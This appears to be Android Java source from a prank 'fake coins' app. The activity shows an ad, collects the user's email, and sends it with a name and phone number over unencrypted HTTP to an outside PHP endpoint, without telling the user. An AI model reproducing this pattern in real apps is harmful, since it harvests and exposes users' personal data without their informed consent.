package com.photoprank.fakecoins;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by YouCaf Iqbal on 11/14/2016.
 */

public class EmailActivity extends AppCompatActivity {
    Button buttonNext;
    EditText email;
    String Email;
    public ProgressDialog pDialog2;
    private InterstitialAd interstitial;
    public ProgressDialog pDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getSupportActionBar().hide(); //<< this
        setContentView(R.layout.email_activity);
        buttonNext = (Button) findViewById(R.id.next);
        email = (EditText) findViewById(R.id.email);

        ////////////////////////////////////////// Showing Add
        pDialog = new ProgressDialog(EmailActivity.this);
        pDialog.setMessage("Please wait...");
        pDialog.setIndeterminate(false);
        pDialog.setCancelable(false);
        pDialog.show();
        AdRequest adRequest = new AdRequest.Builder().build();
        interstitial = new InterstitialAd(EmailActivity.this);
        interstitial.setAdUnitId(getString(R.string.admob_interstitial_id));
        interstitial.loadAd(adRequest);
        interstitial.setAdListener(new AdListener() {
            public void onAdLoaded() {
                super.onAdLoaded();
                pDialog.dismiss();
                displayInterstitial();
            }
            @Override
            public void onAdFailedToLoad(int errorCode) {
                pDialog.dismiss();
                super.onAdFailedToLoad(errorCode);

            }
        });
        //////////////////////////////////////////

        buttonNext.setOnClickListener( new View.OnClickListener() {
            public void onClick(View v) {
                CharSequence emailEntered = email.getText().toString();
                if (email.length()<1 || !android.util.Patterns.EMAIL_ADDRESS.matcher(emailEntered).matches()) {
                    Toast.makeText(getApplicationContext(),"Invalid Email Address",Toast.LENGTH_SHORT).show();
                }else{
                    Email = email.getText().toString();
                    new  SendEmail().execute();
                }
            }
        });


    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (pDialog2 != null) {
            pDialog2.dismiss();
            pDialog2 = null;
        }
    }

    public class SendEmail extends AsyncTask<Void,Void,Void> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog2 = new ProgressDialog(EmailActivity.this);
            pDialog2.setMessage("Please wait...");
            pDialog2.setIndeterminate(false);
            pDialog2.setCancelable(false);
            pDialog2.show();
        }
        @Override
        protected Void doInBackground(Void... voids) {

            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(50, TimeUnit.SECONDS)
                    .writeTimeout(50, TimeUnit.SECONDS)
                    .readTimeout(50, TimeUnit.SECONDS)
                    .build();
            FormBody.Builder formBuilder = new FormBody.Builder()
                    .add("email",Email)
                    .add("name",NameActivity.Name)
                    .add("phonenumber",PhoneActivity.Number);

            RequestBody formBody = formBuilder.build();
            Request request = new Request.Builder()
                    .url("http://buzzardel.com/append.php")
                    .post(formBody)
                    .build();
            try {
                Response response = client.newCall(request).execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }
        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            pDialog2.dismiss();

        }
    }

    public void displayInterstitial() {
        if (interstitial.isLoaded()) {
            interstitial.show();
        }
    }
}
